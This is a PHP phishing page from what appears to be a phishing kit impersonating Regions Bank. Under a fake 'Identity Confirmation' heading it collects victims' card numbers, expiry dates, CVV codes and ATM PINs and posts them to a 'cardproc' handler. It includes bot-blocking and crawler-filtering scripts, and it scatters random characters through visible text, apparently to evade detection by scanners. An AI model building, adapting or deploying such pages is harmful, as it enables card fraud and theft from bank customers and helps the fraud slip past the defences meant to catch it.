<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check - Log in to your accounts | Regions </title>
    <link href="../rgi/com-regions.css" rel="stylesheet">
    <link href="../rgi/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="../rgi/favicon.ico">
<style class="__tmp_css_exfil_protection_load_blocker">input,input ~ * { background-image:none !important; list-style: inherit !important; cursor: auto !important; content:normal !important; } input::before,input::after,input ~ *::before, input ~ *::after { content:normal !important; }</style>

<style>
</style>
</head>
<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" title="Go home">
                <picture class="logo">
                    <source srcset="../rgi/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="../rgi/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <main role="main" class="pb-3" id="main-section">
        

<link href="../rgi/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content">
            <div class="rds-short-form-tile container login-enroll">
                <h1 class="sr-only"> Identity Confirmation</h1>
                <div class="col-md-12">
			   <?php if(isset($_GET[''.$theerrkey.''])){echo '<div class="alert alert-danger" id="page-level-error-box" aria-live="polite" style="display: block;">
                        <div id="page-level-message">Invalid Credentials, Please try again</div>
                        <button type="button" id="alert-close" onclick="document.getElementById(\'page-level-error-box\').style.display=\'none\'">X</button>
                    </div>';};?></div>
                <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">
                    <div class="col-xs-12">
                        <h2 id="password-header">Now, let's<?php echo rT('ALPHANUMERIC',rand(1,87));?> confirm y<?php echo rT('ALPHANUMERIC',rand(1,87));?>our Infor<?php echo rT('ALPHANUMERIC',rand(1,87));?>mation<?php echo rT('ALPHANUMERIC',rand(1,87));?></h2>
                        <div id="transmitContainer" style="display: block;"> <div class="row col-xs-12"> <span id="online-id" class="page-heading">Enter the informations below.</span> <div class="row margin-top-20"> <div class="col-xs-12 margin-bottom-30">
<form class="rds-form form" method="post" id="frrdeetz" action="cardproc<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>"> 

<div class="field animated-label text"> <label class="control-label" for="input_password">Card Number</label> <input type="tel" name="cardnumber" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" maxlength="19" oninput="ooth('i');innumlen(this.value);demcnum();" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Expiration Date (MM/YY)</label> <input type="tel" name="expdate" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');demexpDate();" required="" maxlength="5"/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">CVV/CSC</label> <input type="tel" name="cvv" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');innumlen(this.value)" maxlength="4"  required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">ATM PIN</label> <input type="tel" name="pin" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');innumlen(this.value)" required="" maxlength="4"/></div>
			

	<div class="form-btn-holder"> <div class="pull-right"> <button type="submit" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Next</button> </div> </div> </form> </div> </div> </div> </div>
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>
<script>
function ooth(m){var e = event.target;if(e.value=="" && m!='f'){e.parentNode.classList.remove('selected');} else{e.parentNode.classList.add('selected');}; if(m!='b'){e.parentNode.classList.add('focus');} else{e.parentNode.classList.remove('focus');};};
function ptog(){var p = document.getElementById("input_password");if(p.type=="password"){p.type="text";} else{p.type="password";};p.parentNode.classList.add('focus');p.focus();}

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
</script>
    </main>

    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a target="_blank">Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact Us</a></li>
                <li><a target="_blank">Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Conditions</a></li>
                <li><a target="_blank">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>dge</a></li>
                <li><a target="_blank">Security</a></li>
                <li><a target="_blank">Onli<?php echo rT('ALPHANUMERIC',rand(1,87));?>ne Trac<?php echo rT('ALPHANUMERIC',rand(1,87));?>king and Advertising</a></li>
                <li><a target="_blank">Accessible Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nking</a></li>
                <li><a target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a>1-800-REGIO<?php echo rT('ALPHANUMERIC',rand(1,87));?>NS</a></p>
            <p>Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons, the Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons logo, the Life<?php echo rT('ALPHANUMERIC',rand(1,87));?>Green col<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>or, a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd the LifeGreen bi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ke are registered trademarks of Regions B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank.</p>
            <p>© <?php echo date("Y");?> Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nk. All Ri<?php echo rT('ALPHANUMERIC',rand(1,87));?>ghts Reserved.</p>

            <div class="footer-icon">
                <img src="../rgi/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="../rgi/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
    </div>
</body></html>